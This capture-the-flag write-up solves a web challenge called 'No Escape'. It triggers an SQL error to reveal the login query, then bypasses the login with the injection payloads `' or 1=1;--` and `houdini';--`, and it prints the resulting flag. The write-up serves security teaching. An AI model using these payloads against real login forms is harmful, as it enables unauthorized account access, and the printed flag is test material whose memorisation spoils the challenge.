# No Escape

## Web Security: 60 points

## Solve

Since in-person events are currently banned, some magician we've never heard of is trying to sell us on the idea of a "digital" magic show where the magician logs in using an impossible password. For added assurances, one lucky audience member is able to login and see the hash of the password as proof the password is impossible. We're willing to bet the secret to this magic trick is not all that complicated. http://challenge.acictf.com:43248/

## Hints

* Inexperienced web application developers don't always esacpe/sanitize user inputs in there database query strings. This frequently allows [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) attacks that result in unintended behavior.
* The developer was pretty new, so just causing the query to error out may get you more information for the exploit. What happens when you use a single ' or " in each of the login fields?
* You'll need to login as a specific user. If you're new to SQL syntax, [this](https://www.w3schools.com/sql/sql_where.asp) might be useful resource for understanding the intended query and how you can manipulate it for your purposes.

## Solution

Following the hint, enter a single quote (') in the username and password fields. This gives the following result:

> Oops! It looks like the following query caused an error...  
SELECT username FROM users WHERE username = ''' AND pwHash = '265fda17a34611b1533d8a281ff680dc5791b0ce0a11c25b35e11c8e75685509'

This looks like a SQL injection challenge. Look at the `pwHash`. The hash is 64 characters long, which hints that it might be a sha256 hash. Use a sha256 tool to verify (e.g. https://xorbin.com/tools/sha256-hash-calculator). The sha256 hash of a single quote (') is:

```
265fda17a34611b1533d8a281ff680dc5791b0ce0a11c25b35e11c8e75685509
```

This hash matches the output from the webpage. Therefore, the password field is definitely hashed and is difficult to manipulate. However, the username field is not hashed and can be easily manipulated. Attempt the `1=1` trick:

```
username:
' or 1=1;--

password:
AnyString
```

This worked. The website displays:

> Welcome admin! The "hash" for account 'houdini' is 'Not a hash'.

This gives another lead: the username `houdini`. Now to hack houdini:

```
username:
houdini';--

password:
AnyString
```

Result:
> Welcome Houdini, here's your flag: ACI{fd35465a027eeee3be0249d9f86}